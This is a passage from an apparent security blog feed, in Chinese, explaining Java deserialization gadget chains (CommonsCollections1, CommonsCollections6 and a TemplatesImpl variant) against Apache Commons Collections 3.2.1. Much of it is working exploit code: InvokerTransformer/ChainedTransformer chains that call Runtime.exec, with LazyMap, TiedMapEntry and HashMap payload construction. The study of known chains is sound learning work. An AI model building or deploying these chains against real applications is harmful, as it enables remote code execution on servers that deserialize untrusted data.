class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tiedMapEntryClass</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tiedMapEntryClassDeclaredField</span> <span class="operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        tiedMapEntryClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tiedMapEntryClassDeclaredField.set(tiedMapEntry,tmplazymap);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;特点&quot;&gt;特点&lt;/h5&gt;
&lt;p&gt;更换命令执行方式，之前是
&lt;code&gt;Runtime.getRuntime().exec(&quot;calc&quot;);&lt;/code&gt;
，但很多时候可能存在Runtime过滤的情况，因此将执行命令方式更换为类动态加载执行命令&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="http://example.com/post/1b4135a6.html"/>
    <id>http://example.com/post/1b4135a6.html</id>
    <published>2024-06-11T06:35:18.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="前景提要">前景提要</h5><p>前面两种链子都依赖于<code>jdk</code>版本，在更新后的<code>jdk</code>版本中<code>AnnotationInvocationHandler</code>类已有更新，难以利用</p><p>除了利用<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法以外，还可以利用<code>HashMap</code>类的<code>readObject</code>方法</p><span id="more"></span><h5 id="找链子">找链子</h5><p>首先还是确定好链子终点，还是<code>InvokerTransformer</code>类的<code>transform</code>方法，能够实现执行任意对象的任意方法，因此还是构造<code>ChainedTransformer</code>对象，调用该对象的<code>transform</code>方法可直接实现执行<code>calc</code>命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>还是使用<code>LazyMap</code>类构造实例，该类的<code>get</code>方法实现了<code>Transformer</code>类的<code>transform</code>方法的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>前面提到该次链子的起点是<code>HashMap</code>的<code>readObject</code>方法，而<code>HashMap</code>的<code>readObject</code>方法调用了其<code>key</code>值的<code>hashcode</code>方法，因此下一个点应该是包含<code>map</code>的<code>get</code>方法的<code>hashcode</code>方法，此处选择的是<code>TiedMapEntry</code>，在<code>TiedMapEntry</code>中的<code>hashcode</code>方法，调用了<code>getValue</code>方法，而<code>getValue</code>方法中就调用了<code>map</code>的<code>get</code>方法，此处的<code>map</code>是可控制的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a new entry with the given Map and key.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key  the key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the value of this entry direct from the map.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets a hashCode compatible with the equals method.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * Implemented per API documentation of &#123;<span class="doctag">@link</span> java.util.Map.Entry#hashCode()&#125;</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a suitable hash code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的map传递的应该是构造的<code>LazyMap</code>对象,<code>key</code>值不做影响，因为要执行的<code>transform</code>方法有了<code>new ConstantTransformer(Runtime.class)</code>后本身也不需要传参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(tmplazymap,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后就可以构造<code>HashMap</code>类，而<code>HashMap</code>类传参是一个<code>Map</code>对象，因此<code>tiedMapEntry</code>应该是作为一个键或者值传入该类进行实例化，查看其<code>readObject</code>方法，可以看到的是对<code>key</code>进行<code>hash</code>，调用<code>hashcode</code>方法，因此此处只想要将<code>key</code>指定为<code>tiedMapEntry</code>对象即可</p><p><img src="/post/1b4135a6/image-20240611161336824.png" alt="image-20240611161336824" style="zoom: 50%;"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是这样会引发一个问题，此处的<code>put</code>函数本身也是会调用<code>hashcode</code>方法，因此<code>put</code>之前，不能直接将原<code>tiedMapEntry</code>作为<code>key</code>传入，只能传之后想办法改变<code>tiedMapEntry</code>为原<code>key</code></p><p><img src="/post/1b4135a6/image-20240611161528259.png" alt="image-20240611161528259" style="zoom:50%;"></p><p>此处选择在构造<code>TiedMapEntry</code>对象时，改变传入的<code>map</code>对象，在<code>put</code>后进行反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(tiedMapEntry,tmplazymap);</span><br></pre></td></tr></table></figure><h5 id="代码构造">代码构造</h5><p>综上所述，最后的代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(tiedMapEntry,tmplazymap);</span><br><span class="line">serialize(hashMap);</span><br><span class="line">unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;前景提要&quot;&gt;前景提要&lt;/h5&gt;
&lt;p&gt;前面两种链子都依赖于&lt;code&gt;jdk&lt;/code&gt;版本，在更新后的&lt;code&gt;jdk&lt;/code&gt;版本中&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;类已有更新，难以利用&lt;/p&gt;
&lt;p&gt;除了利用&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;类的&lt;code&gt;readObject&lt;/code&gt;方法以外，还可以利用&lt;code&gt;HashMap&lt;/code&gt;类的&lt;code&gt;readObject&lt;/code&gt;方法&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="http://example.com/post/4ffaad89.html"/>
    <id>http://example.com/post/4ffaad89.html</id>
    <published>2024-06-08T07:59:22.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="前景提要">前景提要</h6><p>jdk版本：8u65 下载链接：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">Java存档下载 — Java SE 8 | Oracle 中国</a></p><p>cc版本：3.2.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip下载到的zip文件中的src/share/classes目录下的sun添加到jdk_8u65/目录下的src.jar解压后的src文件中，再将src/目录添加到项目的sdk源路径中，可实现将class文件转换为java（方便调试）</p><p><img src="/post/4ffaad89/image-20240608170247917.png" alt="image-20240608170247917" style="zoom:50%;"></p><span id="more"></span><h6 id="入口">入口</h6><p>此处为 <code>commons-collections</code> 中 <code>Transformer</code>的实现类 <code>InvokerTransformer</code> 中的 <code>transformer</code>方法如果此处的 <code>this.IMethodName</code> 和<code>this.iParamTypes</code>可以自己构造，即可实现执行任意方法调用功能</p><p><img src="/post/4ffaad89/image-20240608193355690.png" alt="image-20240608193355690" style="zoom: 33%;"></p><h3 id="利用漏洞">利用漏洞</h3><p>简单回顾一下动态调用方法，首先获取Class对象，再获取方法对象，再传入实例名和参数执行该实例的该方法</p><p><img src="/post/4ffaad89/image-20240608194347717.png" alt="image-20240608194347717" style="zoom:33%;"></p><h5 id="终点确认">终点确认</h5><p>尝试创建<code>InvokerTransformer</code>对象，并调用<code>transformer</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.getRuntime());</span><br><span class="line"><span class="comment">//     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment">//     this.iMethodName = methodName;</span></span><br><span class="line"><span class="comment">//        this.iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment">//        this.iArgs = args;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br></pre></td></tr></table></figure><p>也就是此处我们只要能创建 <code>InvokerTransformer</code> 类并执行其<code>transformer</code> 方法就可以实现执行任意方法</p><p>因此下一步是找可以构造指定类执行<code>transformer</code>方法的函数</p><h5 id="进阶1">进阶1</h5><p>根据调用函数选择的是<code>TransformerMap</code>类的<code>checkSetValue</code>方法，此处的<code>valueTransformer</code> 是可构造的</p><p><img src="/post/4ffaad89/image-20240609150002187.png" alt="image-20240609150002187" style="zoom:33%;"></p><p>找到 <code>valueTransformer</code> 和 <code>keyTransformer</code>对象传参定义的地方，为此处的<code>TransformedMap</code>方法</p><p><img src="/post/4ffaad89/image-20240608202436805.png" alt="image-20240608202436805" style="zoom:33%;"></p><p>找到调用 <code>TransformedMap</code>方法的地方，这里的<code>decorate</code>实现了传参创建类的方法</p><p><img src="/post/4ffaad89/image-20240608202535299.png" alt="image-20240608202535299" style="zoom:33%;"></p><p>找到调用 <code>checkSetValue</code>函数的地方，因为这是protect属性，所以只能是内部调用，此处的MapEntry方法定义好parent后，下面的setValue方法实现了checkSetValue的调用，并且传入对象可控制</p><p><img src="/post/4ffaad89/image-20240609150225975.png" alt="image-20240609150225975" style="zoom:30%"></p><p>接着使用该类实现调用<code>InvokerTransformer</code>的<code>transformer</code>方法，这里的<code>MapEntry</code>就相当于遍历键值对，这里的<code>entry</code>也就是上面传入的<code>parent</code>参数，因此调用<code>entry</code>的<code>setValue</code>方法就能最终实现调用对<code>checkSetValue</code>函数的调用，为了保证能够正常遍历执行，<code>map</code>里面需要存入至少一对键值对</p><p><img src="/post/4ffaad89/image-20240609151056987.png" alt="image-20240609151056987" style="zoom:33%;"></p><p>接着寻找调用<code>setValue</code>函数的地方（最好是<code>readObject</code>方法）</p><h6 id="找到调用setvalue的readobject方法的类">找到调用setValue的readObject方法的类</h6><p>通过寻找发现<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法中有调用<code>Map.Entry</code>的<code>setValue</code>方法</p><p><img src="/post/4ffaad89/image-20240609151723683.png" alt="image-20240609151723683" style="zoom:33%;"></p><p>其中关键部分为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">memberValue.setValue(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span></span><br><span class="line">    ).setMember(</span><br><span class="line">        annotationType.members().get(name)</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>因此要做的就是更改此处的<code>memberValues</code>和传入的参数部分</p><p>首先更改memberValues变量，查看该变量的赋值过程，如图所示，是可控的</p><p><img src="/post/4ffaad89/image-20240609152150974.png" alt="image-20240609152150974" style="zoom:33%;"></p><h6 id="代码构造">代码构造</h6><p>首先需要清楚的是Runtime类并不是一个可序列化对象（没有implementsSerializable），因此不能直接定义该对象，只能用反射</p><p>因此Runtime.getRuntime对象获取方式更改为如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>而Method对象是不可序列化的，因此都使用上面的InvokerTransformer类实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">        Class&lt;?&gt; clazz = Runtime.class;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;); <span class="comment">// getRuntime</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method) in.transform(clazz);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">in2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) in2.transform(method);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">in3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        in3.transform(r);</span><br><span class="line"><span class="comment">//        Method method = clazz.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) method.invoke(null);</span></span><br><span class="line"><span class="comment">//        Method exec = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(r, &quot;calc&quot;);</span></span><br></pre></td></tr></table></figure><p>不难发现，整体流程都是一样的，先建立InvokerTransformer对象，再调用其transform方法，因此以上代码进一步简化，通过使用ChainedTransformer数组，该数组调用transform方法可实现上一结果的输出作为下一结果的输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要能执行transformerChain实例的transform方法，并传入参数Runtime.class作为第一个InvokerTransformer对象的传参，以上代码转换为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = 